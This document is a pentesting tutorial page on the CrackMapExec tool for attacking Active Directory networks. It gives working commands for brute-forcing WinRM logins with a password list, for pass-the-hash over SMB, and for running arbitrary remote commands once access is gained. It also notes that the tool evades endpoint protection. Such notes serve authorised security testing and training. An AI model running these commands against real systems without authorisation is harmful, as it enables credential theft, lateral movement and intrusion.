# CrackMapExec

"**_A swiss army knife for pentesting networks..._**" [ [Documentation](https://ptestmethod.readthedocs.io/en/latest/cme.html) ]
- CrackMapExec (a.k.a CME) is a `post-exploitation` tool that helps automate assessing the security of large Active Directory networks. 
- Built with stealth in mind, CME follows the concept of “Living off the Land”: abusing built-in Active Directory features/protocols to achieve it’s functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.

**Supported Protocols:** `WinRM`, `MSSQL`, `SMB`, `SSH`

## Contents
- [Help]()
- [Examples]()
- [WinRM]()
- [Pass-the-Hash (SMB)]()

## Help
- For help and syntax, just issue the command: `crackmapexec`
- [Cheat Sheet](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/)

```
crackmapexec -h
crackmapexec winrm -h  # for help specific to the winrm protocol
crackmapexec smb -h    # for help specific to the smb protocol, etc.
```

## General Syntax

```
crackmapexec <protocol> <target(s)> -u username -p password
```

## Examples

```
crackmapexec <protocol> <target(s)> -u username -p 'Admin!123@'   # or...
crackmapexec <protocol> <target(s)> -u='username' -p='Admin!123@'
```

## WinRM

**Syntax:**

```
crackmapexec winrm [target ip] -u administrator -p /usr/share/.../unix_passwords.txt
```

You can use the `-u` switch to specify a file of possile user names to try.  
- But, if we can get into the admin account, we don't have to do priv esc (so we test with one username, "administrator," first).
- You should get a green `[+]` if successful.

Look over the output (from the top down): 
- First line: you can see it actually connects to WinRM (wsman is an implementation of WinRM: windows management).

**Execute Commands:** 

If you successfully found login credentials, you can crackmapexec to execute arbitrary Windows commands on the target machine. Examples:

```
crackmapexec winrm [target ip] -u administrator -p tinkerbell -x "whoami"
# You should get some happy feedback along with the results of your command execution.
crackmapexec winrm [target ip] -u administrator -p tinkerbell -x "systeminfo"
# This takes a while to run but provides a lot of information about your target system.
```

## Pass-the-Hash (SMB)

**Syntax:**

```
crackmapexec smb [target ip] -u Administrator -H "[administrator ntlm hash; copy-paste]"
```

This should indicated whether or not it works. 

If you get a green `[+]` and (`Pwn3d!`) then it works and you can try the execution of commands on the system...

```
crackmapexec smb [target ip] -u Administrator -H "[administrator ntlm hash; copy-paste]" -x "ipconfig"
```

It should give you visual feedback about the command execution. And there you go. Execute what you want.
